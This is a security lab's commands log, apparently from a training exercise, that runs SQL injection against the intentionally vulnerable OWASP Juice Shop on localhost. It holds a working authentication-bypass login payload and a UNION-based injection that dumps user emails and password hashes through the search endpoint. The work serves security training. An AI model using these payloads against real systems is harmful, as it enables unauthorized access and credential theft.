# Commands Log — OWASP A03: Injection (Juice Shop)

## Setup
cd ~/Alrazzaq_Labs/OWASP-Top-10
mkdir -p 03-Injection/raw-output 03-Injection/screenshots
cd 03-Injection
touch README.md commands.md findings.md methodology.md remediation.md

## Finding 1: SQL Injection — Authentication Bypass
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
  -o raw-output/sqli_login_bypass.json

cat raw-output/sqli_login_bypass.json | python3 -m json.tool

export SQLI_TOKEN=$(cat raw-output/sqli_login_bypass.json | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

## Decode bypass token to confirm admin role + hash granted with no password check
python3 -c "
import base64, json
payload = '$SQLI_TOKEN'.split('.')[1]
payload += '=' * (-len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
"

## Finding 2: SQL Injection — UNION-based data exfiltration via search endpoint

# Baseline (legitimate) search
curl -s "http://localhost:3000/rest/products/search?q=apple" \
  -o raw-output/search_baseline.json
cat raw-output/search_baseline.json | python3 -m json.tool

# Failed attempt (query broke silently, no useful result)
curl -s "http://localhost:3000/rest/products/search?q=apple'))--" \
  -o raw-output/search_sqli_attempt.json
cat raw-output/search_sqli_attempt.json | python3 -m json.tool

# Successful UNION-based injection — dumps entire Users table via product search
curl -s "http://localhost:3000/rest/products/search?q=xxx'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--" \
  -o raw-output/search_sqli_union_users.json
cat raw-output/search_sqli_union_users.json | python3 -m json.tool
